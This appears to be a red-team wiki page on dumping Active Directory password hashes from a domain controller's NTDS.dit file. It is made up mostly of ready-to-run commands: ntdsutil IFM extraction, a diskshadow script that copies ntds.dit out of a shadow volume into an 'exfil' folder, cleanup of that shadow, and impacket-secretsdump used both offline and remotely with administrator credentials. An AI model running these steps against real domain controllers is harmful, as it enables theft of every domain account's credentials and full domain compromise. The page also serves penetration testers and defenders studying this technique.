---
description: Dumping NTDS.dit with Active Directory users hashes
---

# Dumping Domain Controller Hashes Locally and Remotely

## Dumping Domain Controller Hashes Locally and Remotely

### No Credentials - ntdsutil

If you have no credentials, but you have access to the DC, it's possible to dump the ntds.dit using a lolbin ntdsutil.exe:

{% tabs %}
{% tab title="attacker\@victim" %}
```bash
powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
```
{% endtab %}
{% endtabs %}

We can see that the ntds.dit and SYSTEM as well as SECURITY registry hives are being dumped to c:\temp:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LHwsQwvV7EU_0R7IcmU%2F-LHxL7vh26PxkTJwFyQT%2Fntdsutil-attacker.png?alt=media\&token=dfd1be1f-8310-45dd-a369-bd0abca1a357)

We can then dump password hashes offline with impacket:

{% tabs %}
{% tab title="attacker\@local" %}
```bash
root@~/tools/mitre/ntds# /usr/bin/impacket-secretsdump -system SYSTEM -security SECURITY -ntds ntds.dit local
```
{% endtab %}
{% endtabs %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LHxQnhWl68awRQuKyn7%2F-LHxSF6UR9ipGLPfJBLv%2Fntds-hashdump.png?alt=media\&token=496489f2-f758-4617-b8ea-3485083344eb)

### No Credentials - diskshadow

On Windows Server 2008+, we can use diskshadow to grab the ntdis.dit.

Create a shadowdisk.exe script instructing to create a new shadow disk copy of the disk C (where ntds.dit is located in our case) and expose it as drive Z:\\

{% code title="shadow\.txt" %}
```erlang
set context persistent nowriters
set metadata c:\exfil\metadata.cab
add volume c: alias trophy
create
expose %someAlias% z:
```
{% endcode %}

...and now execute the following:

```erlang
mkdir c:\exfil
diskshadow.exe /s C:\users\Administrator\Desktop\shadow.txt
cmd.exe /c copy z:\windows\ntds\ntds.dit c:\exfil\ntds.dit
```

Below shows the ntds.dit got etracted and placed into our c:\exfil folder:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LxkggL0VPYEaC-K2cD6%2F-Lxl1cz6tXd4rJZT_-eG%2Fimage.png?alt=media\&token=fa626e82-3c85-4654-b9a7-fe4bc3449ba4)

Inside interactive diskshadow utility, clean up the shadow volume:

```
diskshadow.exe
    > delete shadows volume trophy
    > reset
```

### With Credentials

If you have credentials for an account that can log on to the DC, it's possible to dump hashes from NTDS.dit remotely via RPC protocol with impacket:

```
impacket-secretsdump -just-dc-ntlm offense/administrator@10.0.0.6
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LtROTHYY8dXw8NhBb2y%2F-LtRPWZbGdpgGxkHl6tf%2Fimage.png?alt=media\&token=bc3bf4f8-8b53-493a-8f2d-3712098228a0)

### References

{% embed url="https://adsecurity.org/?p=2362" %}

{% embed url="https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/" %}
